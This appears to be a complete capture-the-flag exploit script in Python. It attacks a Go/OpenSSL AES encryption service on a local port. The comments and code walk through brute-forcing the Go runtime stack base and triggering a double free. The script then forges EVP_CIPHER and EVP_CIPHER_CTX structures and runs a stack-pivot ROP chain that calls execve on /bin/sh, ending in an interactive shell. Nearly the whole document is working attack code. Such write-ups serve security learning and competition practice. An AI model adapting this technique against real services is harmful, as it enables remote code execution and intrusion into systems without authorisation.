from ptrlib import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def setkey(key):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", key.hex())
def setiv(iv):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", iv.hex())
def setdata(data):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", data.hex())
def encrypt(recv=True):
    sock.sendlineafter("> ", "4")
    if recv:
        plain = sock.recvlineafter(": ")
        cipher = sock.recvlineafter(": ")
        return cipher
    else:
        return None
def decrypt(data, key, iv):
    aes = AES.new(key[:0x10], AES.MODE_CBC, iv[:0x10])
    return aes.decrypt(data)

"""
0) brute force to guess runetime stack address
The base address of runtime stack in golang doesn't change
in multiple execution. However, it may differ in multiple computers.
The base address is aligned by 0x1000 and we can easily find it.
The most lowest possible address is 0xc000000000.
"""
for i in range(0, 0x1000):
    sock = Socket("localhost", 9003)
    #sock = Process("../distfiles/chall")

    """
    1) double free
    The `free` statement before `panic` causes double free
    since `free` is alreadly called by the side effect of `defer`.
    """
    setkey(b"")
    setdata(b"A" * 0x98)
    encrypt(recv=False)

    """
    2) Control RIP
    The buffer for ciphertext may overlap EVP_CIPHER_CTX.
    This can lead to arbitrary code execution.

    0x004548dd: mov rsp, rbx ; mov dword [rsp+0x38], eax ; mov rbp, qword [rsp+0x10] ; add rsp, 0x18 ; ret  ;  (1 found)
    0x00499905: pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret  ;  (451 found)
    """
    #addr_cipher = 0xc00009e0a0 + 0x1000 * i
    addr_cipher = 0xc0000000a0 + 0x1000 * i
    go_syscall3 = 0x45CA75
    go_exit = 0x454520
    rop_stack_pivot = 0x004548dd
    rop_pop4 = 0x00499905

    key  = b'A' * 0x10
    # fake EVP_CIPHER
    key += p32(0x1a3)  # nid
    key += p32(0x10)   # block_size
    key += p32(0x10)   # key_len
    key += p32(0x10)   # iv_len
    key += p64(0x1002) # flags
    key += p64(0xffffffffdeadbeef) # init
    key += p64(0xffffffffdeadbeee) # do_cipher
    key += p64(rop_stack_pivot)    # cleanup
    key += b'/bin/sh\0'

    iv = b'B' * 0x10
    setkey(key)
    setiv(iv)

    # fake EVP_CIPHER_CTX + ROP chain
    payload  = p64(addr_cipher) # EVP_CIPHER
    payload += b'A' * 0x10
    payload += p64(rop_pop4)
    payload += b'C' * 8
    payload += b'D' * 8
    payload += b'E' * 8
    payload += b'F' * 8
    payload += p64(go_syscall3)
    payload += p64(go_exit)
    payload += p64(59)                 # rax
    payload += p64(addr_cipher + 0x30) # rdi
    payload += p64(0)                  # rsi
    payload += p64(0)                  # rdx
    payload += b'A' * (0x88 - len(payload))
    setdata(decrypt(pad(payload, 16), key, iv))
    encrypt()

    try:
        r = sock.recv(timeout=1)
    except:
        break

    if b'stack' in r or b'fatal' in r:
        continue
    else:
        print(r)
        break

sock.interactive()
